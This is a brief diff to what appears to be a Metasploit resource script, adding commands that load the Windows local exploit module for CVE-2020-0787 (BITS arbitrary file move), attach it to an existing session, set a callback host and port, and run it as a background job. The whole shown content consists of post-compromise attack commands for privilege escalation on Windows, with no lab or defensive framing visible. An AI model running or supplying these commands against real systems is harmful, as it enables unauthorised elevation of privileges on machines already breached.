@@ -89,4 +89,9 @@ options
 set session 1
 run
 
+use exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move
+set lport 3232
+set session 1
+set lhost 10.0.0.X
+run -j
 
